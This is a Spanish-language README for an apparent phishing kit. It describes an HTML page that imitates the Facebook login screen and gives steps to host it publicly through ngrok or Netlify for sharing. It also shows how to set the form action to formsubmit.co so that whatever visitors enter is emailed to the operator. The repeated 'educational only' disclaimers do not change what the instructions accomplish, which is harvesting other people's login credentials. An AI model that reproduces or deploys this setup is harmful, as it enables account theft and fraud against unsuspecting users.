# 🌐 Proyecto de Interfaz de Inicio de Sesión

Este repositorio contiene un archivo HTML que simula una interfaz de inicio de sesión para Facebook. El objetivo es aprender cómo funcionan los formularios web y la interacción con servidores locales. **Este proyecto es estrictamente educativo** y no debe usarse con fines maliciosos. 🚫

---

## 📂 Archivos incluidos

- `index.html`: El archivo principal de la interfaz.
- `server.py`: Script en Python para iniciar un servidor local y exponer el proyecto en la red.

---

## 🚀 Opciones para probar el proyecto

### 1️⃣ **Usando Termux o Linux**

#### Requisitos previos

- **Python**: Instálalo en Termux con:
  ```bash
  pkg install python
  ```
- **Ngrok** (opcional para exponer en línea):
  ```bash
  pkg install ngrok
  ```

#### Pasos

1. Clona este repositorio o descarga los archivos.
2. Asegúrate de que el archivo `index.html` y `server.py` estén en el mismo directorio.
3. Ejecuta el script:
   ```bash
   python server.py
   ```
4. Desde el menú, selecciona:
   - `1`: Para iniciar un servidor local en el puerto 8000.
   - `2`: Para exponer el servidor usando ngrok.
5. Abre la URL proporcionada en tu navegador para ver la interfaz.

### 2️⃣ **Usando Netlify**

Si no tienes un entorno Linux o Termux, puedes usar [Netlify](https://netlify.app/) para alojar tu proyecto de forma gratuita y con mayor estabilidad.

#### Pasos para Netlify

1. Ve a [Netlify](https://netlify.app/) y crea una cuenta si no tienes una.
2. Sube tu archivo `index.html`.
3. Netlify generará una URL para tu proyecto que puedes compartir y usar en cualquier navegador.

**💡 Nota**: Netlify es más recomendable si deseas un alojamiento que dure más tiempo sin depender de ngrok.

---

## 🔡 Recomendaciones de seguridad

- **Correo para el formulario**: En el código, reemplaza el correo por uno propio en las siguientes líneas del archivo `index.html`:

  ```html
  <form action="https://formsubmit.co/tu_correo_aqui" method="POST">
  <input type="hidden" name="_email" value="tu_correo_aqui">
  ```

  **Se recomienda usar ProtonMail o Gmail** por su mayor seguridad.

- **Evita el mal uso**: Este proyecto es educativo. Usar este código para recopilar datos sin permiso es ilegal.

---

## ⚙️ Personalización

- Puedes modificar el archivo `index.html` para cambiar el diseño o texto.
- Cambia el puerto del servidor editando la variable `PORT` en `server.py`.

---

## 🖍️ Licencia

Este proyecto está diseñado con fines educativos. Cualquier uso indebido es responsabilidad del usuario.
No soy responsable del mal uso por parte de personas imprudentes o com malas intenciones

**⚠️ Advertencia**: Usa este proyecto solo con fines de aprendizaje.

---

## 👩‍💻 Autor
https://github.com/LuisMiguelsantoslm

Creado por Luis Miguel de los Santos.

---
